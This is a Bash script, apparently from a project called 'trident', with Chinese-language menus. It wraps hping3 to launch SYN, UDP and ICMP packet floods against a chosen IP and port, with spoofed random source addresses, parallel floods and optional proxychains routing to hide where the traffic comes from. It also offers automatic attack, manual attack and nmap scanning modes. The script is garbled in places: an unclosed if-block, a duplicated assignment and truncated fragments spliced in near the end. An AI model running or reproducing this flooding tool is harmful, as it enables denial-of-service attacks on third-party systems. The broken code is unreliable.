#!/bin/bash
# Repository <https://github.com/sshpc/trident>
export LANG=en_US.UTF-8

# 全局变量
selfversion='0.6.0'  # 版本号更新
datevar=$(date +%Y-%m-%d_%H:%M:%S)
menuname='首页'
parentfun=''
installType='apt -y install'
removeType='apt -y remove'
upgrade="apt -y update"
release='linux'
# 获取 CPU 核心数
CONCURRENT_ATTACKS=$(nproc)

TARGET_IP=""
SOURCE_IP=""
DURATION=10
PACKET_SIZE=120
TARGET_PORT=80
PROXY_SERVER=""  # 新增：代理服务器地址
PROXY_PORT=""    # 新增：代理服务器端口
PROXY_USER=""    # 新增：代理用户名
PROXY_PASS=""    # 新增：代理密码

# 目录和文件路径
TRIDENT_TMP_DIR="$HOME/trident_tmp"
CONFIG_FILE="$TRIDENT_TMP_DIR/config.conf"
LOG_FILE="$TRIDENT_TMP_DIR/run.log"
PROXY_FILE="$TRIDENT_TMP_DIR/proxy.conf"  # 新增：代理配置文件

# 颜色定义
_red() {
    printf ' 033[0;31;31m%b 033[0m' "$1"
    echo
}
_green() {
    printf ' 033[0;31;32m%b 033[0m' "$1"
    echo
}
_yellow() {
    printf ' 033[0;31;33m%b 033[0m' "$1"
    echo
}
_blue() {
    printf ' 033[0;31;36m%b 033[0m' "$1"
    echo
}

# ... 其他函数保持不变 ...

# 封装保存配置到文件的函数
save_config() {
    echo -e "TARGET_IP=$TARGET_IP nDURATION=$DURATION nPACKET_SIZE=$PACKET_SIZE nTARGET_PORT=$TARGET_PORT nSOURCE_IP=$SOURCE_IP nPROXY_SERVER=$PROXY_SERVER nPROXY_PORT=$PROXY_PORT nPROXY_USER=$PROXY_USER nPROXY_PASS=$PROXY_PASS" >"$CONFIG_FILE"
    _green "配置已保存到 $CONFIG_FILE"
}

# 配置代理服务器
configure_proxy() {
    read -ep "请输入代理服务器地址(IP或域名): " proxy_server
    PROXY_SERVER=$proxy_server
    
    read -ep "请输入代理服务器端口: " proxy_port
    PROXY_PORT=$proxy_port
    
    read -ep "请输入代理用户名(如无需认证请留空): " proxy_user
    PROXY_USER=$proxy_user
    
    if [ -n "$proxy_user" ]; then
        read -sp "请输入代理密码: " proxy_pass
        echo
        PROXY_PASS=$proxy_pass
    else
        PROXY_PASS=""
    fi
    
    # 生成代理配置文件
    echo "http $PROXY_SERVER $PROXY_PORT $PROXY_USER $PROXY_PASS" > "$PROXY_FILE"
    _green "代理配置已保存"
    save_config
}

# 清除代理配置
clear_proxy() {
    PROXY_SERVER=""
    PROXY_PORT=""
    PROXY_USER=""
    PROXY_PASS=""
    rm -f "$PROXY_FILE"
    _green "代理配置已清除"
    save_config
}

# 执行攻击的通用函数
execute_attack() {
    local attack_type=$1
    local attack_flag=$2
    local target_ip=$3
    local target_port=$4
    local packet_size=$5
    local duration=$6

    local sourcepattern="--rand-source"
    local proxy_cmd=""

    # 判断来源IP不为空
    if [[ -n "$SOURCE_IP" ]]; then
        sourcepattern="-a $SOURCE_IP"
    fi
    
    # 判断是否使用代理
    if [[ -n "$PROXY_SERVER" && -n "$PROXY_PORT" ]]; then
        if [[ -n "$PROXY_USER" && -n "$PROXY_PASS" ]]; then
            proxy_cmd="proxychains -f $PROXY_FILE"
        else
            proxy_cmd="proxychains"
        fi
        _yellow "使用代理: $PROXY_SERVER:$PROXY_PORT"
    fi

    log_action "Attack Start" "$proxy_cmd hping3 -c $((duration * 1000)) -d $packet_size $attack_flag -p $target_port --flood $sourcepattern $target_ip"

    if [[ "$attack_type" == "ICMP" ]]; then
        _yellow "攻击类型: $attack_type"
        _yellow "目标: $target_ip"
        _yellow "命令: $proxy_cmd hping3 -c $((duration * 1000)) -d $packet_size $attack_flag --flood $sourcepattern $target_ip"
        $proxy_cmd hping3 -c $((duration * 1000)) -d "$packet_size" $attack_flag --flood $sourcepattern "$target_ip" &
    else
        _yellow "攻击类型: $attack_type"
        _yellow "目标: $target_ip:$target_port"
        _yellow "命令: $proxy_cmd hping3 -c $((duration * 1000)) -d $packet_size $attack_flag -p $target_port --flood $sourcepattern $target_ip"
        $proxy_cmd hping3 -c $((duration * 1000)) -d "$packet_size" $attack_flag -p "$target_port" --flood $sourcepattern "$target_ip" &
    fi
}

# 优化检查依赖函数，添加错误处理
check_deps() {
    local deps=('hping3' 'nmap' 'curl')
    
    # 如果配置了代理，添加proxychains依赖
    if [[ -n "$PROXY_SERVER" && -n "$PROXY_PORT" ]]; then
        deps+=('proxychains')
    fi
    
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &>/dev/null; then
            _yellow "$dep 未安装，正在安装..."
            if ! ${upgrade}    ! ${installType} "$dep"; then
                _red "安装 $dep 失败，请检查网络或权限。"
                exit 1
            fi
    done
}

# 高级设置
advanced_settings() {
    menuname="首页/高级设置"
    options=(
        "配置-目标 IP" configure_target_ip
        "配置-数据包大小" configure_packet_size
        "配置-持续时间" configure_duration
        "配置-目标端口" configure_target_port
        "配置-来源 IP" configure_source_ip
        "配置代理" configure_proxy       # 新增：代理配置选项
        "清除代理" clear_proxy           # 新增：清除代理选项
    )
    menu "${options[@]}"
}

# ... 其他函数保持不变 ...

# 主菜单
main() {
    # 加载配置文件
    if [ -f "$CONFIG_FILE" ]; then
        source "$CONFIG_FILE"
    fi

    menuname='首页'menuname='首页'
    options=(
        "全自动攻击" auto_attack
        "手动攻击" hping3_attack
        "端口扫描" nmap_scan
        "升级脚本" update_script
        "高级设置" advanced_settings
        "查看日志" cat_log
_red() {
    printf 
    echo

    read 
checkSystem
# 检查依赖
check_deps

        echo
if [ ! -d "$TRIDENT_TMP_DIR" ]; then
    mkdir -p "$TRIDENT_TMP_DIR"
fi

# 脚本退出时清理
trap cleanup EXIT

    _green 
